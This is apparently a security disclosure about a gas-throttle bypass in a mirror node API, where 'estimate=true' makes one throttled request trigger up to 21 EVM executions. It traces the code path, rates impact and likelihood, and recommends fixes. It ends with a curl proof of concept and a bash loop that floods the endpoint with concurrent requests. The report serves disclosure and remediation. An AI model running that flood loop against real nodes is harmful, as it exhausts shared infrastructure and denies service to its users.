### Title
Gas Throttle Bypass via `estimate=true` Binary Search Amplification (21x EVM Execution per Single Throttle Token)

### Summary
Any unauthenticated caller can set `estimate=true` in a POST to `/api/v1/contracts/call`. This routes through `ContractExecutionService.estimateGas()`, which runs one initial EVM execution plus up to 20 additional EVM executions inside `BinaryGasEstimator.search()`. The `gasLimitBucket` is consumed exactly once upfront (for `request.getGas()`), and `restoreGasToBucket` is explicitly skipped for every binary-search iteration (`estimate=true`). The result is that a single throttle-token purchase buys up to 21 full EVM executions, giving an attacker a 21x amplification factor against the server's CPU, memory, and database resources.

### Finding Description

**Entry point** ŌĆö `ContractController.call()`:
```
throttleManager.throttle(request);          // line 40: 1 RPS token + scaleGas(gas) gas tokens consumed ONCE
...
contractExecutionService.processCall(params); // line 44
```

**Branch on `isEstimate`** ŌĆö `ContractExecutionService.processCall()` line 53-54:
```java
if (params.isEstimate()) {
    result = estimateGas(params, ctx);   // binary-search path
```

**`estimateGas()` ŌĆö two-phase execution** (lines 81-98):
```java
// Phase 1: initial call with estimate=false ŌåÆ restoreGasToBucket IS called
final var processingResult = callContract(params, context);

// Phase 2: binary search ŌĆö up to 20 iterations with estimate=true
binaryGasEstimator.search(
    ...,
    gas -> doProcessCall(params, gas, true),   // estimate=true
    gasUsedByInitialCall,
    params.getGas());
```

**`doProcessCall()` ŌĆö gas restore guard** (lines 127-135 of `ContractCallService.java`):
```java
finally {
    if (!estimate) {                          // ŌåÉ binary-search iterations NEVER enter here
        restoreGasToBucket(result, params.getGas());
        ...
    }
}
```

**`BinaryGasEstimator.search()` loop** (lines 35-58):
```java
while (lo + 1 < hi && iterationsMade < properties.getMaxGasEstimateRetriesCount()) {
    // calls doProcessCall(params, mid, true) ŌĆö no gas accounting
    iterationsMade++;   // up to 20
}
```

**Root cause**: `throttle()` is called once at the HTTP layer and accounts for `request.getGas()` gas. The binary-search loop calls `doProcessCall(..., true)` up to 20 times; the `estimate=true` flag explicitly bypasses `restoreGasToBucket`, and no additional gas tokens are consumed or tracked for those iterations. The `rateLimitBucket` similarly charges exactly 1 token for the entire request regardless of how many EVM executions it triggers.

### Impact Explanation

The `gasLimitBucket` is the primary defense against EVM-resource exhaustion. With default settings (`gasPerSecond=7,500,000,000`, `maxGasLimit=15,000,000`), the bucket allows ~500 max-gas requests per second. An attacker sending all requests with `estimate=true` forces up to 21 EVM executions per request while the bucket sees only 1. Effective EVM throughput the attacker can force: 500 ├Ś 21 = 10,500 full EVM executions/second against a system budgeted for 500. This is a server-side DoS amplification attack requiring no credentials, no special contract, and no on-chain state ŌĆö just a valid HTTP POST body with `"estimate": true`.

### Likelihood Explanation

- No authentication or authorization is required.
- The `estimate` field is a standard, documented boolean in `ContractCallRequest`; any user of the public API can set it.
- The attack is trivially repeatable in a tight loop from a single client.
- No special contract or on-chain setup is needed; even a call to a non-existent address with `estimate=true` triggers the binary search path.

### Recommendation

1. **Charge gas tokens per binary-search iteration**: inside `BinaryGasEstimator.search()`, consume (and restore) gas tokens from the bucket for each `doProcessCall` invocation, or pre-multiply the upfront gas charge by `maxGasEstimateRetriesCount` for estimate requests.
2. **Differentiate RPS tokens**: consume more than 1 `rateLimitBucket` token for estimate requests (e.g., `maxGasEstimateRetriesCount` tokens), or maintain a separate, lower-capacity bucket for estimate calls.
3. **Cap binary-search gas**: use a lower effective gas ceiling for each binary-search iteration rather than the full `params.getGas()`, reducing per-iteration cost.

### Proof of Concept

```bash
# Single request ŌĆö triggers 1 initial EVM call + up to 20 binary-search EVM calls
# Consumes only 1 rateLimitBucket token and scaleGas(15000000)=1500 gasLimitBucket tokens

curl -X POST https://<mirror-node>/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{
    "to":       "0x0000000000000000000000000000000000000001",
    "data":     "0x",
    "gas":      15000000,
    "estimate": true
  }'

# Flood loop ŌĆö each iteration buys 21 EVM executions for the price of 1 throttle token
for i in $(seq 1 500); do
  curl -s -X POST https://<mirror-node>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d '{"to":"0x0000000000000000000000000000000000000001","data":"0x","gas":15000000,"estimate":true}' &
done
wait
# Result: up to 10,500 EVM executions triggered against a system budgeted for 500/s
```
